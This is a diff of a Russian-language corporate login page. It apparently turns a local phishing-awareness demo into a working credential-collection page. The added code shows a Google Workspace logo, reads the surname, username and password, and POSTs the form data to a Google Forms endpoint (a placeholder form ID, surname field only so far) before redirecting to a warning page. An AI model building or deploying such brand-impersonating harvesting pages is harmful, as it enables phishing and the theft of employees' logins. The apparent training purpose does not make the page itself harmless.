@@ -9,195 +9,107 @@
       gtag('js', new Date());
       gtag('config', 'G-KQNV90TC0L');
     </script>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Корпоративный портал | Вход в систему</title>
     <style>
-        :root {
-            --primary: #0056b3;
-            --primary-dark: #004494;
-            --text: #333333;
-            --light: #f8f9fa;
-            --danger: #dc3545;
-            --success: #28a745;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
         body {
-            background: #f5f5f5;
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
         }
-        
         .login-container {
-            width: 100%;
-            max-width: 450px;
             background: white;
+            padding: 30px;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+            width: 350px;
         }
-        
-        .login-header {
-            background: var(--primary);
-            color: white;
-            padding: 25px;
+        .logo {
             text-align: center;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 20px;
         }
-        
-        .login-header h1 {
+        .logo img {
+            width: 50px;
+            height: 50px;
+        }
+        h1 {
             font-size: 22px;
-            font-weight: 500;
-            margin-bottom: 5px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
         }
-        
-        .login-header p {
-            opacity: 0.9;
-            font-size: 14px;
-        }
-        
-        .login-form {
-            padding: 25px;
-        }
-        
         .form-group {
             margin-bottom: 15px;
         }
-        
-        .form-group label {
+        label {
             display: block;
-            margin-bottom: 6px;
-            color: var(--text);
-            font-size: 14px;
-            font-weight: 500;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
         }
-        
-        .form-control {
-            width: 100%;
-            padding: 10px 12px;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            font-size: 14px;
-            transition: border-color 0.15s ease-in-out;
-        }
-        
-        .form-control:focus {
-            outline: 0;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 0.2rem rgba(0, 86, 179, 0.25);
-        }
-        
-        .btn {
+        input {
             width: 100%;
             padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: white;
             border: none;
             border-radius: 4px;
-            background: var(--primary);
-            color: white;
-            font-size: 16px;
-            font-weight: 500;
+            font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.15s ease-in-out;
+            margin-top: 10px;
         }
-        
-        .btn:hover {
-            background: var(--primary-dark);
+        button:hover {
+            background-color: #3367d6;
         }
-        
-        .footer-links {
-            margin-top: 15px;
+        .footer {
             text-align: center;
-            font-size: 13px;
-            color: #6c757d;
-        }
-        
-        .footer-links a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-        
-        .logo {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 15px;
-            background: white;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .logo img {
-            width: 40px;
-            height: 40px;
-        }
-        
-        .security-notice {
-            font-size: 12px;
-            color: #6c757d;
             margin-top: 20px;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-        }
-        
-        .error-message {
-            color: var(--danger);
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
+            font-size: 12px;
+            color: #777;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <div class="login-header">
-            <div class="logo">
-                <img src="https://cdn-icons-png.flaticon.com/512/179/179309.png" alt="Company Logo">
-            </div>
-            <h1>Корпоративный портал</h1>
-            <p>Вход в систему для сотрудников</p>
+        <div class="logo">
+            <img src="https://www.gstatic.com/images/branding/product/1x/admin_512dp.png" alt="Google Workspace">
         </div>
+        <h1>Вход в корпоративный портал</h1>
         
-        <div class="login-form">
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="lastname">Фамилия</label>
-                    <input type="text" id="lastname" class="form-control" placeholder="Иванов" required>
-                    <div class="error-message" id="lastnameError">Пожалуйста, введите вашу фамилию</div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="username">Имя пользователя</label>
-                    <input type="text" id="username" class="form-control" placeholder="ivanov.i" required>
-                    <div class="error-message" id="usernameError">Пожалуйста, введите ваш логин</div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="password">Пароль</label>
-                    <input type="password" id="password" class="form-control" placeholder="••••••••" required>
-                    <div class="error-message" id="passwordError">Пожалуйста, введите ваш пароль</div>
-                </div>
-                
-                <button type="submit" class="btn">Войти</button>
-                
-                <div class="footer-links">
-                    <a href="#">Забыли пароль?</a> | <a href="#">Помощь</a>
-                </div>
-                
-                <div class="security-notice">
-                    <p>Для вашей безопасности выйдите из системы, закончив работу.</p>
-                </div>
-            </form>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="lastname">Фамилия</label>
+                <input type="text" id="lastname" name="lastname" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="username">Имя пользователя</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit">Войти</button>
+        </form>
+        
+        <div class="footer">
+            © 2024 Корпоративная система. Все права защищены.
         </div>
     </div>
 
@@ -205,42 +117,31 @@
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Сброс сообщений об ошибках
-            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');
+            // Получаем данные формы
+            const formData = {
+                lastname: document.getElementById('lastname').value,
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value
+            };
             
-            // Проверка полей
-            let isValid = true;
-            const lastname = document.getElementById('lastname').value.trim();
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            if(!lastname) {
-                document.getElementById('lastnameError').style.display = 'block';
-                isValid = false;
-            }
-            
-            if(!username) {
-                document.getElementById('usernameError').style.display = 'block';
-                isValid = false;
-            }
-            
-            if(!password) {
-                document.getElementById('passwordError').style.display = 'block';
-                isValid = false;
-            }
-            
-            if(isValid) {
-                // В учебных целях просто выводим данные в консоль
-                console.log('Собранные данные:', {
-                    lastname: lastname,
-                    username: username,
-                    password: password,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Перенаправление на страницу с предупреждением
-                window.location.href = 'warning.html';
-            }
+            // Отправляем данные в Google Forms
+            fetch('https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    'entry.1659127593': formData.lastname,  // Замените на реальный ID поля
+                })
+            })
+            .then(() => {
+                // Перенаправление после успешной отправки
+                window.location.href = 'https://example.com/warning.html';
+            })
+            .catch((error) => {
+                console.error('Ошибка:', error);
+            });
         });
     </script>
 </body>
